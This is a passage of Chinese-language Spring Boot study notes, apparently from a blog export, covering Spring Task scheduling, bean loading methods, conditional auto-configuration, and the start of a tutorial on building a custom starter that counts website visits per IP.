springboot整合Quartz就是将Quartz对应的核心对象交给spring容器管理，包含两个对象，JobDetail和Trigger对象\n2. JobDetail对象描述的是工作的执行信息，需要绑定一个QuartzJobBean类型的对象\n3. Trigger对象定义了一个触发器，需要为其指定绑定的JobDetail是哪个，同时要设置执行周期调度器\n\n### ②Task\n\n> Spring Task是Spring 3.0自带的定时任务，可以将它看作成一个轻量级的Quartz，功能虽然没有Quartz那样强大，但是使用起来非常简单，无需增加额外的依赖，可直接上手使用。\n\n**步骤①**：开启定时任务功能，在引导类上开启定时任务功能的开关，使用注解`@EnableScheduling`\n\n```java\n@SpringBootApplication\n@EnableScheduling //开启定时任务功能\npublic class SpringbootTaskApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(Springboot22TaskApplication.class, args);\n    }\n}\n```\n\n**步骤②**：定义Bean，在对应要定时执行的操作上方，使用注解`@Scheduled`定义执行的时间，执行时间的描述方式还是cron表达式\n\n```java\n@Component\npublic class MyBean {\n    @Scheduled(cron = \"0/1 * * * * ?\")\n    public void print(){\n        System.out.println(\"spring task run...\");\n        System.out.println(Thread.currentThread().getName()); //调度线程名 ssm_1\n    }\n}\n```\n\n**步骤③**：如何想对定时任务进行相关配置，可以通过配置文件进行\n\n```yaml\nspring:\n  task:\n   \tscheduling:\n      pool:\n       \tsize: 1\t\t\t\t\t\t\t# 任务调度线程池大小 默认 1\n      thread-name-prefix: ssm_      \t# 调度线程名称前缀 默认 scheduling-      \n        shutdown:\n          await-termination: false\t\t# 线程池关闭时等待所有任务完成\n          await-termination-period: 10s\t# 调度线程关闭前最大等待时间，确保最后一定关闭\n```\n\n**总结**\n\n1. spring task需要使用注解@EnableScheduling开启定时任务功能\n\n2. 注解@Scheduled为定时执行的的任务设置执行周期，描述方式cron表达式\n\n## 6.整合认证授权\n\n### ①Spring Security\n\n### ②Shiro\n\n### ③Oauth2\n\n## 7.整合文档操作\n\n### ①PDF\n\n### ②Word\n\n### ③Excel\n\n### ④上传下载\n\n## 8.整合通知\n\n### ①邮件\n\n### ②钉钉\n\n### ③微信\n\n### ④短信\n\n\n\n\n\n## Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringBoot"],"categories":["Spring"]},{"title":"SpringBoot-原理篇","url":"/posts/41747.html","content":"\n> 原理篇包含自动配置工作流程、自定义starter开发、springboot程序启动流程、掌握SpringBoot内部工作流程、理解SpringBoot整合第三方技术的原理\n\n小简从 0 开始学 Java 知识之 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《SpringBoot-原理篇》，不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计5天更新完\n- [x] 🎯开始时间：09-15\n- [x] 🎉结束时间：09-17\n- [x] 🍀总结：了解了个大概，后续再深入研究\n\n- 学习目标\n\n| 课程单元                                   | 学习目标                                                     |\n| ------------------------------------------ | ------------------------------------------------------------ |\n| <font color=\"#990000\"><b>原理篇</b></font> | 掌握SpringBoot内部工作流程<br/>理解SpringBoot整合第三方技术的原理<br/>实现自定义开发整合第三方技术的组件 |\n\n- 前置知识\n\n| 课程单元                                   | 前置知识 | 要求                                                         |\n| ------------------------------------------ | -------- | ------------------------------------------------------------ |\n| <font color=\"#990000\"><b>原理篇</b></font> | Spring   | 了解Spring加载bean的各种方式<br/>知道Spring容器底层工作原理，能够阅读简单的Spring底层源码 |\n\n\n\n# 1.自动配置工作流程\n\n## ①bean的加载方式\n\n### ❶配置文件+`<bean/>`标签\n\n最初级的bean的加载方式其实可以直击spring管控bean的核心思想，就是提供类名，然后spring就可以管理了。所以第一种方式就是给出bean的类名，内部通过反射机制加载类名后创建对象，对象就是spring管控的bean。\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n    <!--xml方式声明自己开发的bean-->\n    <bean id=\"cat\" class=\"Cat\"/>\n    <bean class=\"Dog\"/>\n\n    <!--xml方式声明第三方开发的bean-->\n    <bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\"/>\n    <bean class=\"com.alibaba.druid.pool.DruidDataSource\"/>\n    <bean class=\"com.alibaba.druid.pool.DruidDataSource\"/>\n</beans>\n```\n\n### ❷配置文件扫描+注解\n\n由于❶中需要将spring管控的bean全部写在xml文件中，非常不友好。现在哪一个类要受到spring管控加载成bean，就在这个类的上面加一个注解，还可以顺带起一个bean的名字（id）。这里可以使用的注解有`@Component`以及三个衍生注解`@Service`、`@Controller`、`@Repository`\n\n```java\n@Component(\"tom\")\npublic class Cat {}\n```\n\n由于我们无法在第三方提供的技术源代码中去添加上述4个注解，因此当你需要加载第三方开发的bean的时候可以使用下列方式定义注解式的bean。定义一个方法添加`@Bean`，当前方法的返回值就可以交给spring管控，记得这个方法所在的类添加`@Component`或者`@Configuration`\n\n```JAVA\n@Component\npublic class DbConfig {\n    @Bean\n    public DruidDataSource dataSource(){\n        DruidDataSource ds = new DruidDataSource();\n        return ds;\n    }\n}\n```\n\n上面提供的仅仅是bean的声明，spring并没有感知到这些东西，像极了上课积极回答问题的你，手举的非常高，可惜老师都没有往你的方向看上一眼。可以通过下列xml配置设置spring去检查哪些包，发现定了对应注解，就将对应的类纳入spring管控范围，声明成bean。\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:context=\"http://www.springframework.org/schema/context\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"\n       http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\n       http://www.springframework.org/schema/context\n       http://www.springframework.org/schema/context/spring-context.xsd\n    \">\n    <!--指定扫描加载bean的位置-->\n    <context:component-scan base-package=\"com.jianjian.bean,com.jianjian.config\"/>\n</beans>\n```\n\n### ❸纯注解\n\n定义一个配置类并使用`@ComponentScan`替代❷中的包扫描这个动作。\n\n```java\n@Configuration\n@ComponentScan({\"com.itheima.bean\",\"com.itheima.config\"})\npublic class SpringConfig {\n    @Bean\n    public DruidDataSource dataSource(){\n        DruidDataSource ds = new DruidDataSource();\n        return ds;\n    }\n}\n```\n\n### ❹@Import注解\n\n由于使用`@ComponentScan`扫描的时候范围太大了，使用@Import注解它可以只加载你需要的bean即可。只需要在注解的参数中写上加载的类对应的.class，而且加载的bean可以不用@Component修饰\n\n```java\n@Import({Dog.class,DbConfig.class})\npublic class SpringConfig {\n}\n```\n\n### ❺编程形式\n\n前面介绍的加载bean的方式都是在容器启动阶段完成bean的加载，下面这种方式就比较特殊了，可以在容器初始化完成后手动加载bean。通过这种方式可以实现编程式控制bean的加载。\n\n```java\npublic class App {\n    public static void main(String[] args) {\n        AnnotationConfigApplicationContext ctx = new AnnotationConfigApplicationContext(SpringConfig.class);\n        //上下文容器对象已经初始化完毕后，手工加载bean\n        ctx.register(Cat.class);\n    }\n}\n```\n\n### ❻ImportSelector接口\n\n是否可以在容器初始化过程中进行控制呢？答案是必须的。实现ImportSelector接口的类可以设置加载的bean的全路径类名，记得一点，只要能编程就能判定，能判定意味着可以控制程序的运行走向，进而控制一切。\n\n```java\npublic class MyImportSelector implements ImportSelector {\n    @Override\n    public String[] selectImports(AnnotationMetadata metadata) {\n        //各种条件的判定，判定完毕后，决定是否装载指定的bean\n        boolean flag = metadata.hasAnnotation(\"org.springframework.context.annotation.Configuration\");\n        if(flag){\n            return new String[]{\"com.itheima.bean.Dog\"};\n        }\n        return new String[]{\"com.itheima.bean.Cat\"};\n    }\n}\n```\n\n### ❼ImportBeanDefinitionRegistrar接口\n\n❻中提供了给定类全路径类名控制bean加载的形式，其实bean的加载不是一个简简单单的对象，spring中定义了一个叫做BeanDefinition的东西，它才是控制bean初始化加载的核心。BeanDefinition接口中给出了若干种方法，可以控制bean的相关属性。说个最简单的，创建的对象是单例还是非单例，在BeanDefinition中定义了scope属性就可以控制这个。如果你感觉❻中没有给你开放出足够的对bean的控制操作，那么可以通过定义一个类实现ImportBeanDefinitionRegistrar接口的方式定义bean，并且还可以让你对bean的初始化进行更加细粒度的控制\n\n```java\npublic class MyRegistrar implements ImportBeanDefinitionRegistrar {\n    @Override\n    public void registerBeanDefinitions(AnnotationMetadata metadata, BeanDefinitionRegistry registry) {\n        BeanDefinition beanDefinition = \t\n            BeanDefinitionBuilder.rootBeanDefinition(BookServiceImpl2.class).getBeanDefinition();\n        registry.registerBeanDefinition(\"bookService\",beanDefinition);\n    }\n}\n```\n\n### \t❽BeanDefinitionRegistryPostProcessor接口\n\n当某种类型的bean被接二连三的使用各种方式加载后，在你对所有加载方式的加载顺序没有完全理解清晰之前，你不知道最后谁说了算。BeanDefinitionRegistryPostProcessor，全称bean定义后处理器，它在所有bean注册都折腾完后，把最后一道关，它是最后一个运行的。\n\n```java\npublic class MyPostProcessor implements BeanDefinitionRegistryPostProcessor {\n    @Override\n    public void postProcessBeanDefinitionRegistry(BeanDefinitionRegistry registry) throws BeansException {\n        BeanDefinition beanDefinition = \n            BeanDefinitionBuilder.rootBeanDefinition(BookServiceImpl4.class).getBeanDefinition();\n        registry.registerBeanDefinition(\"bookService\",beanDefinition);\n    }\n}\n\n```\n\n## ②bean的加载控制\n\n企业级开发中不可能在spring容器中进行bean的饱和式加载的。合理的加载方式是用什么加载什么。所以在spring容器中，通过判断一个类的全路径名是否能够成功加载来控制bean的加载是一种常见操作。\n\n```java\npublic class MyImportSelector implements ImportSelector {\n    @Override\n    public String[] selectImports(AnnotationMetadata importingClassMetadata) {\n        try {\n            Class<?> clazz = Class.forName(\"com.jianjian.bean.Mouse\");\n            if(clazz != null) {\n                return new String[]{\"com.jianjian.bean.Cat\"};\n            }\n        } catch (ClassNotFoundException e) {\n\t\t\t\t\t\t//e.printStackTrace();\n            return new String[0];\n        }\n        return null;\n    }\n}\n```\n\n通过上述的分析，可以看到此类操作将成为企业级开发中的常见操作，于是springboot将把这些常用操作给我们做了一次封装。通过注解实现上面的操作。\n\n- `@ConditionalOnClass`注解实现了当虚拟机中加载了指定类时才加载对应的bean。\n\n```java\n@Bean\n@ConditionalOnClass(name = \"com.jianjian.bean.Wolf\")\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n- `@ConditionalOnMissingClass`注解实现了虚拟机中没有加载指定的类才加载对应的bean。\n\n```java\n@Bean\n@ConditionalOnMissingClass(\"com.jianjian.bean.Dog\")\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n这种条件还可以做并且的逻辑关系，写2个就是2个条件都成立，写多个就是多个条件都成立。\n\n```java\n@Bean\n@ConditionalOnClass(name = \"com.jianjian.bean.Wolf\")\n@ConditionalOnMissingClass(\"com.jianjian.bean.Mouse\")\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n- `@ConditionalOnWebApplication`判定当前容器环境是否是web环境。\n\n```java\n@Bean\n@ConditionalOnWebApplication\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n- `@ConditionalOnNotWebApplication`判定容器环境是否是非web环境。\n\n```java\n@Bean\n@ConditionalOnNotWebApplication\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n- `@ConditionalOnBean`判定是否加载了指定名称的bean\n\n```java\n@Bean\n@ConditionalOnBean(name=\"jerry\")\npublic Cat tom(){\n    return new Cat();\n}\n```\n\n**总结**\n\nspringboot定义了若干种控制bean加载的条件设置注解，由spring固定加载bean变成了可以根据情况选择性的加载bean\n\n## ③bean的依赖属性\n\nbean的加载及加载控制已经搞完了，下面研究一下bean内部的事情。bean在运行的时候，实现对应的业务逻辑时有可能需要开发者提供一些设置值，有就是属性了。如果使用构造方法将参数固定，灵活性不足，这个时候就可以使用bean的属性配置进行灵活的配置了。\n\n**步骤①：**先通过yml配置文件，设置bean运行需要使用的配置信息。\n\n```yaml\ncartoon:\n  cat:\n    name: \"图多盖洛\"\n    age: 5\n  mouse:\n    name: \"泰菲\"\n    age: 1\n```\n\n**步骤②：**然后定义一个封装属性的专用类，加载配置属性，读取对应前缀相关的属性值。\n\n```java\n@ConfigurationProperties(prefix = \"cartoon\")\n@Data\npublic class CartoonProperties {\n    private Cat cat;\n    private Mouse mouse;\n}\n```\n\n**步骤③：**最后在使用的位置注入对应的配置即可。\n\n```java\n@EnableConfigurationProperties(CartoonProperties.class)\npublic class CartoonCatAndMouse{\n    @Autowired\n    private CartoonProperties cartoonProperties;\n}\n```\n\n建议在业务类上使用@EnableConfigurationProperties声明bean，这样在不使用这个类的时候，也不会无故加载专用的属性配置类CartoonProperties，减少spring管控的资源数量。\n\n## ④自动装配原理\n\n啥叫自动配置呢？简单说就是springboot根据我们开发者的行为猜测你要做什么事情，然后把你要用的bean都给你准备好。springboot咋做到的呢？就是看你导入了什么类，就知道你想干什么了。然后把你有可能要用的bean都给你加载好，你直接使用就行了，springboot把所需要的一切工作都做完了。整体过程分为2个阶段：\n\n**阶段一：准备阶段**\n\n1. springboot的开发人员先大量收集Spring开发者的编程习惯，整理开发过程每一个程序经常使用的技术列表，形成一个**技术集A**\n\n2. 收集**技术集A**的最常用的设置，把这些设置作为默认值直接设置好，得到开发过程中每一个技术的常用设置，形成每一个技术对应的**设置集B**\n\n\n**阶段二：加载阶段**\n\n3. springboot初始化Spring容器基础环境，读取用户的配置信息，加载用户自定义的bean和导入的坐标，形成**初始化环境**\n4. springboot将**技术集A**包含的所有技术在SpringBoot启动时默认全部加载，这时肯定加载的东西有一些是无效的，没有用的\n5. springboot会对**技术集A**中每一个技术约定启动这个技术对应的条件，并设置成按条件加载，由于开发者导入了一些bean和坐标，也就是与**初始化环境**，这个时候就可以根据这个**初始化环境**与springboot的**技术集A**进行比对了，哪个匹配上加载哪个\n6. 因为有些技术不做配置就无法工作，所以springboot先加载**设置集B**中的默认值，这样可以减少开发者配置参数的工作量\n7. 但是默认配置不一定能解决问题，于是springboot开放修改**设置集B**的接口，可以由开发者根据需要决定是否覆盖默认配置\n\n假定我们想自己实现自动配置的功能，都要做哪些工作呢？\n\n- 首先指定一个技术X，我们打算让技术X具备自动配置的功能，这个技术X可以是任意功能，这个技术隶属于上面描述的**技术集A**\n\n```java\npublic class CartoonCatAndMouse{\n}\n```\n\n- 然后找出技术X使用过程中的常用配置Y，这个配置隶属于上面表述的**设置集B**\n\n```yaml\ncartoon:\n  cat:\n    name: \"图多盖洛\"\n    age: 5\n  mouse:\n    name: \"泰菲\"\n    age: 1\n```\n\n- 然后定义一个属性类封装对应的配置属性，这个过程其实就是上一节咱们做的bean的依赖属性管理，一模一样\n\n```JAVA\n@ConfigurationProperties(prefix = \"cartoon\")\n@Data\npublic class CartoonProperties {\n    private Cat cat;\n    private Mouse mouse;\n}\n```\n\n- 最后做一个配置类，当这个类加载的时候就可以初始化对应的功能bean，并且可以加载到对应的配置\n\n```JAVA\n@EnableConfigurationProperties(CartoonProperties.class)\npublic class CartoonCatAndMouse implements ApplicationContextAware {\n    private CartoonProperties cartoonProperties;\n}\n```\n\n- 当然，你也可以为当前自动配置类设置上激活条件，例如使用@CondtionOn为其设置加载条件\n\n```JAVA\n@ConditionalOnClass(name=\"org.springframework.data.redis.core.RedisOperations\")\n@EnableConfigurationProperties(CartoonProperties.class)\npublic class CartoonCatAndMouse implements ApplicationContextAware {\n    private CartoonProperties cartoonProperties;\n}\n```\n\n做到这里都已经做完了，但是遇到了一个全新的问题，如何让springboot启动的时候去加载这个类呢？如果不加载的话，我们做的条件判定，做的属性加载这些全部都失效了。springboot为我们开放了一个配置入口，在类路径(resources/)下创建`META-INF`目录，并创建`spring.factories`文件，在其中添加设置，说明哪些类要启动自动配置就可以了。\n\n```properties\n# Auto Configure\norg.springframework.boot.autoconfigure.EnableAutoConfiguration=\\\ncom.jianjian.bean.CartoonCatAndMouse\n```\n\n其实这个文件就做了一件事，通过这种配置的方式加载了指定的类。那自动配置的核心究竟是什么呢？自动配置其实是一个小的生态，可以按照如下思想理解：\n\n1. 自动配置从根本上来说就是一个bean的加载\n2. 通过bean加载条件的控制给开发者一种感觉，自动配置是自适应的，可以根据情况自己判定，但实际上就是最普通的分支语句的应用，这是蒙蔽我们双眼的第一层面纱\n3. 使用bean的时候，如果不设置属性，就有默认值，如果不想用默认值，就可以自己设置，也就是可以修改部分或者全部参数，也是一种自适应的形式，其实还是需要使用分支语句来做判断的，这是蒙蔽我们双眼的第二层面纱\n4. springboot技术提前将大量开发者有可能使用的技术提前做好了，条件也写好了，用的时候你导入了一个坐标，对应技术就可以使用了，其实就是提前帮我们把spring.factories文件写好了，这是蒙蔽我们双眼的第三层面纱\n\n​\t\t你在不知道自动配置这个知识的情况下，经过上面这一二三，你当然觉得自动配置是一种特别牛的技术，但是一窥究竟后发现，也就那么回事。而且现在springboot程序启动时，在后台偷偷的做了这么多次检测，这么多种情况判定，不用问了，效率一定是非常低的，毕竟它要检测100余种技术是否在你程序中使用。\n\n**总结**\n\n1. springboot启动时先加载spring.factories文件中的org.springframework.boot.autoconfigure.EnableAutoConfiguration配置项，将其中配置的所有的类都加载成bean\n2. 在加载bean的时候，bean对应的类定义上都设置有加载条件，因此有可能加载成功，也可能条件检测失败不加载bean\n3. 对于可以正常加载成bean的类，通常会通过@EnableConfigurationProperties注解初始化对应的配置属性类并加载对应的配置\n4. 配置属性类上通常会通过@ConfigurationProperties加载指定前缀的配置，当然这些配置通常都有默认值。如果没有默认值，就强制你必须配置后使用了\n\n## ⑤变更自动配置\n\nspringboot的自动配置并不是必然运行的，可以通过配置的形式干预是否启用对应的自动配置功能。系统默认会加载100多种自动配置的技术，我们可以先手工干预此工程，禁用一些自动配置\n\n**方式一：通过yaml配置设置排除指定的自动配置类**\n\n```YAML\nspring:\n  autoconfigure:\n    exclude:\n      - org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration\n```\n\n**方式二：通过注解参数排除自动配置类**\n\n```JAVA\n@EnableAutoConfiguration(excludeName = \"\",exclude = {})\n```\n\n**方式三：排除坐标（应用面较窄）**\n\n例如web程序启动时会自动启动tomcat服务器，可以通过排除坐标的方式，让加载tomcat服务器的条件失效。不过需要提醒一点，你把tomcat排除掉，记得再加一种可以运行的服务器。\n\n```XML\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n        <!--web起步依赖环境中，排除Tomcat起步依赖，匹配自动配置条件-->\n        <exclusions>\n            <exclusion>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-tomcat</artifactId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n    <!--添加Jetty起步依赖，匹配自动配置条件-->\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-jetty</artifactId>\n    </dependency>\n</dependencies>\n```\n\n# 2.自定义starter开发\n\n自动配置学习完后，我们就可以基于自动配置的特性，开发springboot技术中最引以为傲的功能了，starter。其实通过前期学习，我们发现用什么技术直接导入对应的starter，然后就实现了springboot整合对应技术，再加上一些简单的配置，就可以直接使用了。这种设计方式对开发者非常友好，本章就通过一个案例的制作，开发自定义starter来实现自定义功能的快捷添加。\n\n## ⓪案例：网站访问次数\n\n> 本案例的功能是统计网站独立IP访问次数的功能，并将访问信息在后台持续输出。整体功能是在后台每10秒输出一次监控信息（格式：IP+访问次数） ，当用户访问网站时，对用户的访问行为进行统计。\n>\n> 例如：张三访问网站功能15次，IP地址：192.168.0.135，李四访问网站功能20次，IP地址：61.129.65.248。那么在网站后台就输出如下监控信息，此信息每10秒刷新一次。\n>\n> ```bash\n>    IP访问监控\n> +-----ip-address-----+--num--+\n> |     192.168.0.135  |   15  |\n> |     61.129.65.248  |   20  |\n> +--------------------+-------+\n> ```\n>\n> 本功能最终要实现的效果是在现有的项目中导入一个starter，对应的功能就添加上了，删除掉对应的starter，功能就消失了，要求功能要与原始项目完全解耦。因此需要开发一个独立的模块，制作对应功能。\n\n在进行具体制作之前，先对功能做具体的分析\n\n1. 数据记录在什么位置\n\n\n最终记录的数据是一个字符串（IP地址）对应一个数字（访问次数），此处可以选择的数据存储模型可以使用java提供的map模型，也就是key-value的键值对模型，或者具有key-value键值对模型的存储技术，例如redis技术。本案例使用map作为实现方案。\n\n2. 统计功能运行位置\n\n因为每次web请求都需要进行统计，因此使用拦截器会是比较好的方案，本案例使用拦截器来实现。不过在制作初期，先使用调用的形式进行测试，等功能完成了，再改成拦截器的实现方案。\n\n3. 为了提升统计数据展示的灵活度，为统计功能添加配置项。\n\n- 输出频度，默认10秒\n\n- 数据特征：累计数据 / 阶段数据，默认累计数据\n\n- 输出格式：详细模式 / 极简模式 \n\n在开发中我们分成若干个步骤实现。先完成最基本的统计功能的制作，然后开发出统计报表，接下来把所有的配置都设置好，最后将拦截器功能实现，整体功能就做完了。\n\n最终实现代码：https://jwt1399.lanzouv.com/iG0LW0buql7g\n\n**项目文件结构**\n\n```bash\nipcount-spring-boot-starter\n├── pom.xml\n└── src\n    └── main\n        ├── java\n        │   └── com\n        │       └── jianjian\n        │           ├── IpcountApplication.java\n        │           ├── autoconfigure\n        │           │   └── IpAutoConfiguration.java\n        │           ├── interceptor\n        │           │   ├── IpCountInterceptor.java\n        │           │   └── SpringMvcConfig.java\n        │           ├── properties\n        │           │   └── IpProperties.java\n        │           └── service\n        │               └── IpCountService.java\n        └── resources\n            ├── META-INF\n            │   ├── spring-configuration-metadata.json\n            │   └── spring.factories\n            └── application.yml\n```\n\n## ①IP计数业务功能开发\n\n**步骤一：创建全新的模块，定义业务功能类**\n\n创建web模块`ipcount-spring-boot-starter`，定义一个业务类，声明一个Map对象，用于记录ip访问次数，key是ip地址，value是访问次数\n\n```java\npublic class IpCountService {\n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n}\n```\n\n有些小伙伴可能会有疑问，不设置成静态的，如何在每次请求时进行数据共享呢？记得，当前类加载成bean以后是一个单例对象，对象都是单例的，哪里存在多个对象共享变量的问题。\n\n**步骤二：制作统计功能**\n\n制作统计操作对应的方法，每次访问后对应ip的记录次数+1。需要分情况处理，如果当前没有对应ip的数据，新增一条数据，否则就修改对应key的值+1即可\n\n```java\npublic class IpCountService {\n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n    public void count(){\n        //每次调用当前操作，就记录当前访问的IP，然后累加访问次数\n        //1.获取当前操作的IP地址\n        String ip = null;\n        //2.根据IP地址从Map取值，并递增\n        Integer count = ipCountMap.get(ip);\n        if(count == null){\n            ipCountMap.put(ip,1);\n        }else{\n            ipCountMap.put(ip,count + 1);\n        }\n    }\n}\n```\n\n因为当前功能最终导入到其他项目中进行，而导入当前功能的项目是一个web项目，因此可以从容器中直接获取请求对象，获取IP地址的操作可以通过自动装配得到请求对象，然后获取对应的访问IP\n\n```java\npublic class IpCountService {\n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n    @Autowired\n    //当前的request对象的注入工作由使用当前web-starter的工程提供自动装配\n    private HttpServletRequest httpServletRequest;\n    public void count(){\n        //每次调用当前操作，就记录当前访问的IP，然后累加访问次数\n        //1.获取当前操作的IP地址\n        String ip = httpServletRequest.getRemoteAddr();\n        //2.根据IP地址从Map取值，并递增\n        Integer count = ipCountMap.get(ip);\n        if(count == null){\n            ipCountMap.put(ip,1);\n        }else{\n            ipCountMap.put(ip,count + 1);\n        }\n        //打印出信息\n        System.out.println(ipCountMap);\n    }\n}\n\n//优化后代码\npublic class IpCountService {\n    private Map<String, Integer> ipCountMap = new HashMap<>();\n    @Autowired\n    //当前的request对象的注入工作由使用当前starter的工程提供自动装配\n    private HttpServletRequest httpServletRequest;\n    public void count(){\n        String ip = httpServletRequest.getRemoteAddr();\n        ipCountMap.put(ip,ipCountMap.getOrDefault(ip,0) + 1);\n        System.out.println(ipCountMap);\n    }\n}\n```\n\n**步骤三：定义自动配置类**\n\n我们需要做到的效果是导入当前模块即开启此功能，因此使用自动配置实现功能的自动装载，需要开发自动配置类在启动项目时加载当前功能。\n\n```java\n@Configuration\npublic class IpAutoConfiguration {\n    @Bean\n    public IpCountService ipCountService(){\n        return new IpCountService();\n    }\n}\n```\n\n自动配置类需要在spring.factories文件中做配置方可自动运行。\n\n```properties\n# Auto Configure\norg.springframework.boot.autoconfigure.EnableAutoConfiguration=\\\n  com.jianjian.autoconfigure.IpAutoConfiguration\n```\n\n**步骤四：在其它项目中模拟调用，测试功能**\n\n在其它项目调用本项目，导入当前开发的starter，切记使用之前先clean后install安装到maven仓库，确保资源更新\n\n```xml\n<dependency>\n    <groupId>com.jianjian</groupId>\n    <artifactId>ipcount-spring-boot-starter</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n</dependency>\n```\n\n推荐选择调用方便的功能做测试，推荐使用分页操作，当然也可以换其他功能位置进行测试。\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController {\n    @Autowired\n    private IpCountService ipCountService; //引入对象\n    @GetMapping(\"{currentPage}/{pageSize}\")\n    public R getPage(@PathVariable int currentPage,@PathVariable int pageSize,Book book){\n        ipCountService.count(); //测试功能\n        IPage<Book> page = bookService.getPage(currentPage, pageSize,book);\n        if( currentPage > page.getPages()){\n            page = bookService.getPage((int)page.getPages(), pageSize,book);\n        }\n        return new R(true, page);\n    }\n}\n```\n\n**当前效果**：每次调用分页操作后，可以在控制台输出当前访问的IP地址\n\n<font color=\"#f0f\"><b>温馨提示</b></font>\n\n由于当前制作的功能需要在对应的调用位置进行坐标导入，因此必须保障仓库中具有当前开发的功能，所以每次原始代码修改后，需要重新编译并安装到仓库中。为防止问题出现，建议每次安装之前先`clean`然后`install`，保障资源进行了更新。切记切记！！\n\n## ②定时任务报表开发\n\n当前已经实现了在业务功能类中记录访问数据，但是还没有定时输出监控的信息到控制台。由于监控信息需要每10秒输出1次，因此需要使用定时器功能。此处选用Spring内置的task作为实现方案。\n\n**步骤一：开启定时任务功能**\n\n定时任务功能开启需要在当前功能的总配置中设置，结合现有业务设定，比较合理的位置是设置在自动配置类上。加载自动配置类即启用定时任务功能。\n\n```JAVA\n@EnableScheduling\npublic class IpAutoConfiguration {\n    @Bean\n    public IpCountService ipCountService(){\n        return new IpCountService();\n    }\n}\n```\n\n**步骤二：制作显示统计数据功能**\n\n定义显示统计功能的操作print()，并设置定时任务，当前设置每5秒运行一次统计数据。\n\n```JAVA\npublic class IpCountService {\n  \n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n\n    @Scheduled(cron = \"0/5 * * * * ?\")\n    public void print(){\n        System.out.println(\"         IP访问监控\");\n        System.out.println(\"+-----ip-address-----+--num--+\");\n        for (Map.Entry<String, Integer> entry : ipCountMap.entrySet()) {\n            String key = entry.getKey();\n            Integer value = entry.getValue();\n            System.out.println(String.format(\"|%18s  |%5d  |\",key,value));\n        }\n        System.out.println(\"+--------------------+-------+\");\n      }\n}\n```\n\n显示样式\n\n```bash\n\n         IP访问监控\n+-----ip-address-----+--num--+\n|         127.0.0.1  |    1  |\n+--------------------+-------+\n```\n\n**当前效果**：每次调用分页操作后，可以在控制台看到统计数据，到此基础功能已经开发完毕。\n\n## ③使用属性设置功能参数\n\n由于当前报表显示的信息格式固定，为提高报表信息显示的灵活性，需要通过yml文件设置参数，控制报表的显示格式。\n\n**步骤一：定义参数格式**\n\n设置3个属性，分别用来控制显示周期（cycle），阶段数据是否清空（cycleReset），数据显示格式（model）\n\n```yaml\ntools:\n  ip:\n    cycle: 10\n    cycleReset: false\n    model: \"detail\"\n```\n\n**步骤二：定义封装参数的属性类，读取配置参数**\n\n为防止项目组定义的参数种类过多，产生冲突，通常设置属性前缀会至少使用两级属性作为前缀进行区分。\n\n```java\n@Data\n@ConfigurationProperties(prefix = \"tools.ip\")\npublic class IpProperties {\n    /**\n     * 日志显示周期\n     */\n    private Long cycle = 5L; //默认值\n    /**\n     * 是否周期内重置数据\n     */\n    private Boolean cycleReset = false;\n    /**\n     * 日志输出模式  detail：详细模式  simple：极简模式\n     */\n    private String model = LogModel.DETAIL.value;\n    public enum LogModel{\n        DETAIL(\"detail\"),\n        SIMPLE(\"simple\");\n        private String value;\n        LogModel(String value) {\n            this.value = value;\n        }\n        public String getValue() {\n            return value;\n        }\n    }\n}\n```\n\n日志输出模式是在若干个类别选项中选择某一项，对于此种分类性数据建议制作枚举定义分类数据，当然使用字符串也可以。\n\n**步骤三：加载属性类**\n\n```java\n@EnableScheduling\n@EnableConfigurationProperties(IpProperties.class)\npublic class IpAutoConfiguration {\n    @Bean\n    public IpCountService ipCountService(){\n        return new IpCountService();\n    }\n}\n```\n\n**步骤四：应用配置属性**\n\n在应用配置属性的功能类中，使用自动装配加载对应的配置bean，然后使用配置信息做分支处理。\n\n注意：清除数据的功能一定要在输出后运行，否则每次查阅的数据均为空白数据。\n\n```java\npublic class IpCountService {\n    private Map<String,Integer> ipCountMap = new HashMap<String,Integer>();\n    @Autowired\n    private IpProperties ipProperties;\n    @Scheduled(cron = \"0/5 * * * * ?\")\n    public void 